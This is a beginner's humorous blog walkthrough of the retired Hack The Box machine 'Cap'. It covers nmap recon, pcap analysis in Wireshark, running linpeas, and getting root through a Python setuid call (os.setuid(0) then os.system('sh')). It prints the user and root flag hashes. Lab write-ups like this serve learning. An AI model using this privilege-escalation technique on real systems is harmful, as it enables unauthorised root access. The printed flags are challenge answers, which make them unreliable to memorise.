---
title: "Cap: setuid, learning my way around HTB"
pubDate: 2025-07-22
description: "An easy box on htb"
categories: ["network", "reconnaissance", "beginner", "nmap", "wireshark", "linpeas"]
---

# HTB - Cap
**Status = Retired**

<img width="238" height="111" alt="Screenshot 2025-07-22 153140" src="https://github.com/user-attachments/assets/12d3f116-c153-4fda-b3d6-f92441effc41" />

## The First Time's Always Awkward

Look, I'm not going to pretend this was some masterclass in hacking. This was my first rodeo on HTB, and like any good origin story, it started with me stumbling around like a drunk penguin on ice. I had a walkthrough video playing in the background like some kind of cybersecurity ASMR, and yes, I leaned on it like a crutch. But here's the thing; I didn't just copy-paste my way through it. I actually tried to understand what I was doing, which is more than I can say for most of my life decisions.

This is my first attempt at one of these writeups, so bear with me. I'm learning as I go, just like I'm learning this whole "hacking" thing. Think of this as my digital diary entry, but with more explosions and less teenage angst.

---

## Tools of the Trade (Or My Excuse for a Toolbox)

- **nmap** — Because sometimes you need to knock on doors before breaking them down
- **wireshark** — The digital equivalent of eavesdropping on your neighbors' phone calls
  ```bash
  sudo pacman -S wireshark-qt wireshark-cli
  ```
- **ftp** — Because apparently, some people still use this in 2025
- **OpenVas** — The security scanner that makes you feel like you're doing something important
- **PEASS-ng "linpeas"** — The Swiss Army knife of privilege escalation
  ```bash
  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
  ```
- **view-source:http://** — Because sometimes the best recon is just looking at the source code like a digital archaeologist

---

## The Commands That Got Me There (And Some That Didn't)

```bash
ssh                    # Because apparently, typing commands is still a thing
ftp                    # The digital equivalent of using a rotary phone
ls                     # The most basic command that I still mess up
ls -la                 # When you want to see everything, including the kitchen sink
scp ~/htb/tools/linpeas.sh nathan@10.10.10.245:/tmp  # File transfer like it's 1999
cd /tmp                # Because /tmp is where all the cool kids hang out
chmod +x linpeas.sh    # Making things executable, because magic
./linpeas.sh           # Running the script that does all the heavy lifting
nano                   # The editor for people who can't remember vim commands
cat                    # Reading files like a civilized human being
ls -la /usr/bin/python3.8  # Because Python is everywhere, like glitter
python3                # The language that makes everything possible
import os              # Because sometimes you need to talk to the operating system
whoami                 # The existential question of the digital age
os.setuid(0)           # Becoming root, because why not?
os.system('sh')        # Getting a shell, because that's what we came for
```

---

## The Setup (Or How I Learned to Stop Worrying and Love the VPN)

The box was already logged into Nathan's dashboard on startup, which was either incredibly convenient or suspiciously easy. I'm still not sure which. It's like walking into a house where someone left the keys under the mat and a note saying "Please rob me."

---

## My Greatest Hits (And Misses)

### The Mistakes That Made Me Look Like a Skid
- **sudo attempts for a non-sudo user** — This resulted in "event logged" messages, which is basically the digital equivalent of setting off every alarm in the building
- **Multiple failed write attempts** — I was like a drunk trying to put a key in a lock, except the lock was logging everything I did
- **Skipping questions** — I got stuck on question 4 and just said "screw it" and went straight for the flags. In retrospect, I should have completed everything, but I'm not exactly known for my patience

---

## The Recon Phase (Or How I Learned to Love nmap)

### Open Ports
- **3 ports** — Because apparently, this box was running on a budget
- Using nmap to scan the target "nathan" IP 10.10.10.245 (which was conveniently provided, because HTB is nice like that)

### The PCAP Adventure
Luckily for us, Nathan already had the ability to download files from his dashboard. It's like finding out your target has a "Download" button that says "Click here for free flags." I downloaded the pcap files and then used Wireshark to read and follow the digital breadcrumbs like some kind of cyber detective.

---

## The User Flag (Or How I Found It Twice)

```bash
nathan@cap:/home$ cd nathan
nathan@cap:~$ ls
snap  user.txt
nathan@cap:~$ cat user.txt
cce3b7fa31a62cd458ec2b28cd278480
```

Fun fact: I actually found this flag early on, didn't pay attention, and then had to backtrack like an idiot. It's like finding your keys in your pocket after you've already called a locksmith.

---

## The Root Flag (Because I am root!)

<img width="662" height="164" alt="Screenshot 2025-07-22 141841" src="https://github.com/user-attachments/assets/5e474074-5900-47d5-9b00-acb1f020626b" />

To get to root, we used python for setuid to assign os.system to the user (0) becoming root.

<img width="736" height="203" alt="Screenshot 2025-07-22 155506" src="https://github.com/user-attachments/assets/6373c136-fead-4945-9bbb-826fdb5c0689" />



```bash
>>> os.setuid(0)
>>> os.system('whoami')
root
0
>>> ls
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'ls' is not defined
>>> os.system('sh')
# ls
snap  user.txt
# cd /root
# ls
root.txt  snap
# cat root.txt
0f3ac34aa7be9f1d96970a50f545a48c
```

This was the moment where I felt like a real hacker. I mean, I was basically just running a Python script that someone else wrote, but hey, it worked. It's like using a calculator to do math — you still get credit for the answer.

---

## Lessons Learned (Or How I Realized I Know Nothing)

### 1. The Pwnbox Dilemma
Although the pwnbox and web instances are great for allowing all users the ability to practice and learn, I much prefer using my own tools and OS. Like a nice rental car but then driving your own — you know where everything is, and you don't have to worry about someone else's weird settings. I started out using the pwnbox but quickly switched to my own VM using the provided VPN file.

### 2. The Question-Skipping Incident
I skipped several questions and just went essentially to the flags. This was directly because no matter what I tried to identify the pcap ID as, they were all "wrong." Since the primary goal was user and root flags, I stopped answering the other questions at 4 and skipped to 7, 8, 9. In retrospect, I should have completed it all, but I'm not exactly known for my attention span.

### 3. The Noisy Operator
I was very noisy in this exercise, trying several things, adding files without deleting them on completion, and a few other things. I could have, and should have, been much quieter with my attempts. It's like trying to sneak into a house while wearing tap shoes and a cowbell.

### 4. The Alternative Routes Theory
There's a possibility of more than one exploit route. Maybe I'm wrong, and I often am, but the fact that I was able to write to directories makes me assume that I could also find alternative ways to root than the way I did. For example: CVE-2021-3560 which was found using linpeas. Polkit. I also had access to nano, so that may have been something too. I know you only need one, but it's nice to know you have options.

<img width="825" height="463" alt="Screenshot 2025-07-22 145138" src="https://github.com/user-attachments/assets/6bfa751f-8062-418d-b9bb-cea226d67643" />


### 5. The Backtracking Revelation
Although I successfully found the flags, I actually found the user flag early on, didn't pay attention, and then had to backtrack. Several other obvious mistakes were made, but I did learn several things. Most importantly, I learned that I have a LOT to learn still.

---

## The Takeaway

This was my first step into a larger world. I'm not pretending to be some cybersecurity prodigy, but I'm also not going to pretend I didn't learn anything. Every mistake was a lesson, every failure was a step forward, and every flag was a small victory.

I'm still learning, still making mistakes, and still figuring out what I'm doing. But that's the beauty of it — nobody starts as an expert. We all start as beginners, stumbling around in the dark, trying to figure out which way is up.


Question loudly so others can learn quietly. Stay curious. Stay loud.

Don't Be A Skid
-Zero

[Buy Me A Coffee @iamnotaskid](https://buymeacoffee.com/iamnotaskid)
